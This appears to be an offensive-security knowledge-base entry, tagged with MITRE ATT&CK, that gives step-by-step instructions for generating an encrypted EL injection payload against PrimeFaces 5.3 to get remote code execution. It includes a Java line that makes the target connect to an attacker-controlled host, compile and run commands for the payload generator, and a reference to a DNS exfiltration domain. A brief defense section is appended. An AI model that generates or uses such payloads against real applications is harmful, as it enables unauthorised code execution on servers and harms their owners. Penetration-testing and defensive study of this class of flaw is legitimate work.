---
tags:
  - rce
  - el-injection
  - payload-generation
  - java
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:07.861Z'
sub_techniques: []
id: e8de4017-0422-431d-aac5-a7ad9fa1c889
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Generate Encrypted EL Payload for PrimeFaces RCE

## Summary

This procedure generates an encrypted Expression Language (EL) payload using a custom Java program that leverages the PrimeFaces 5.3 JAR to create a malicious string for injection, enabling RCE via DNS resolution on vulnerable JSF applications.

## Description

In the context of exploiting EL injection in PrimeFaces 5.3's DynamicContent generator, this procedure involves compiling and executing a Java program that encrypts an EL expression to trigger arbitrary Java code execution. The payload is designed to cause the server to resolve a DNS name under attacker control, confirming RCE without performing destructive actions like file deletion. Prerequisites include access to the PrimeFaces 5.3 JAR and a Java compiler. This is typically used after identifying the vulnerable version through application source inspection.

## Requirements

1. Java Development Kit (JDK) installed
2. PrimeFaces 5.3 JAR file in the classpath
3. Custom Java source code for payload generation (PayloadGenerator.java)
4. Controlled DNS domain for exfiltration (e.g., a subdomain on dnsbin.zhack.ca)

## Defense

Defensive measures and detection strategies:

- Upgrade to PrimeFaces versions >5.3 with input sanitization on pfdrid
- Implement web application firewall (WAF) rules to block suspicious EL patterns in query parameters
- Monitor DNS queries from web servers for anomalous resolutions to external domains

## Objectives

1. Produce a valid encrypted payload for EL injection
2. Ensure payload triggers non-destructive RCE (DNS lookup)
3. Avoid server-side errors during payload processing

## Instructions

### Step 1: Prepare the Java Program

**Context**: Modify the PayloadGenerator.java source to set the remoteMalJarUrl to your controlled DNS domain, ensuring the EL expression attempts a DNS resolution (e.g., new java.net.URL("http://attacker-dns.com").openConnection().connect()).

No command; edit the source file manually.

> Update the string variable and save the file.

### Step 2: Compile the Program

**Context**: Compile the Java source with the PrimeFaces JAR to handle EL encryption logic.

**Command** (javac-compile-payload):
```bash
javac -cp PrimeFaces-5.3.jar PayloadGenerator.java
```

> This compiles the program, linking against PrimeFaces classes for encryption. Expected output: No errors, generates PayloadGenerator.class.

### Step 3: Execute the Generator

**Context**: Run the compiled program to output the encrypted payload string.

**Command** (java-run-payload-generator):
```bash
java -cp .:PrimeFaces-5.3.jar PayloadGenerator
```

> Executes the program, printing the encrypted payload to stdout. Copy this for use in subsequent steps. Expected output: Encrypted string (e.g., a long encoded value).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- rce
- el-injection
- java
